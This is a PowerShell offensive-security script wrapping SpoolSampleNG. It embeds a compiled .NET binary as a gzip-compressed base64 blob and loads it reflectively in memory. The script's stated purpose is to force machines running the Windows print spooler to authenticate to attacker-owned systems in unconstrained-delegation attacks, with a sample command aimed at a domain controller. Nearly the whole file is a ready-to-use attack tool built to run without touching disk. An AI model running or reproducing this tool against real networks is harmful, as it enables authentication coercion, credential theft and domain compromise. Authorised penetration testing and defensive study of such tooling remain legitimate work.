﻿function Invoke-SpoolSample {
#.SYNOPSIS
# Wrapper for Unconstrained Delegation Exploitation via SpoolSampleNG (.NET v3.5)
# ARBITRARY VERSION NUMBER:  1.0.0
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# SpoolSampleNG is a C# implementation of SpoolSample modified for .NET reflection, allowing attackers
# to force computers with the spooler (MS-RPRN) running to authenticate to attacker owned systems 
# (specifically useful in cases where an attacker has elevated privileges on a system with Unconstrained
# Delegation privileges).
#
# This wrapper contains the entire binary with the byte stream being Gzip compressed base64 encoded.
#
# Parameters:
#   -Command  -->  Targets to force authentication through (\\source \\destination).
#   -Help     -->  Return Get-Help information
#
# Usage:
#   Unconstrained Delegation : Invoke-SpoolSample -Command "\\dc.domain \\pwned.domain"
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory
# https://github.com/tylerdotrar/SpoolSampleNG


    Param (
        [string]$Command,
        [switch]$Help
    )


    if ($Help)     { return (Get-Help Invoke-SpoolSample) }
    if (!$Command) { return '[-] Must input targets.' }


    # Gzip Compression and Base64 Encoding
    <#

    $BinaryPath = '<absolute_path_to_binary>'
    $FileStream = [IO.MemoryStream]::new([IO.File]::ReadAllBytes($BinaryPath))
    $CompressedStream = [IO.MemoryStream]::new()
    $Gzip = [IO.Compression.GzipStream]::new($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $FileStream.CopyTo($Gzip)
    $Gzip.Close()
    $Base64 = [Convert]::ToBase64String($CompressedStream.ToArray())

    #>


    # SpoolSampleNG.exe (.NET v3.5) Base64 Encoded Gzip Byte-Stream
    $Bytes = [IO.MemoryStream]::new([Convert]::FromBase64String('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'))

    $Gzip = [IO.Compression.GzipStream]::new($Bytes, [IO.Compression.CompressionMode]::Decompress)
    $DecompressedStream = [IO.MemoryStream]::new()
    $Gzip.CopyTo($DecompressedStream)
    $Gzip.Close()

    $RAS = [System.Reflection.Assembly]::Load($DecompressedStream.ToArray())
    $OldConsoleOut = [Console]::Out
    $StringWriter = [IO.StringWriter]::new()
    [Console]::SetOut($StringWriter)

    # Binary Namespace
    [SpoolSampleNG.Program]::Main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $StringWriter.ToString()
}